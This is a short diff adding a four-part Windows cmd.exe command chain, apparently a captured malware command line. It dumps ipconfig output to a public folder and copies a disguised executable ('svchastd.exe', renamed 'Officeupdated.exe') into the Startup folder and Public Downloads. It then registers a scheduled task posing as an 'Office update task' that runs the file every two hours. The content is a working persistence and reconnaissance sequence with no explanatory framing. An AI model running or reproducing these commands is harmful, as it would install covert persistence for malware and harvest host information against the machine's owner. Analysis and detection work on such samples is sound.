@@ -1,0 +1,4 @@
+"C:\\Windows\\System32\\cmd.exe"  /c ipconfig>C:\\Users\\Public\\Downloads\\d3reEW.txt 
+& copy C:\\Users\\user\\AppData\\Local\\Temp\\svchastd.exe "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Officeupdated.exe"  
+& copy C:\\Users\\user\\AppData\\Local\\Temp\\svchastd.exe \"C:\\Users\\Public\\Downloads\\Officeupdated.exe\" 
+& schtasks /create /SC minute /MO 120 /TN \"Office update task\"  /TR "C:\\Users\\Public\\Downloads\\Officeupdated.exe"
